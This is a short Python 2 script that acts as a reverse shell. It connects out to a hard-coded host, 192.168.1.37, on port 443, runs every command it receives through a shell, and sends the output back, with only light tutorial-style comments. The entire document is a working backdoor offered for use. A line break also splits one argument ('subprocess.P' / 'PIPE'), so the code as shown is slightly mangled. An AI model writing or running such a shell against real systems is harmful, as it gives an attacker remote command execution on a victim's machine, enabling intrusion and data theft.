import subprocess,socket

HOST ='192.168.1.37'
PORT =443

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)#AF_INET sets the internet protocol
            #SOCK _STREAM controls transmission protocol            

s.connect((HOST, PORT))
s.send('Hello There!')

while 1:
    data = s.recv(1024)
    if data == 'close': break

    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.P
                            PIPE)

    stdoutput = proc.stdout.read() + proc.stderr.read()

    s.send(stdoutput)
    
#exit the loop
s.send('Good Bye Now.')
s.close()
                            
    
                
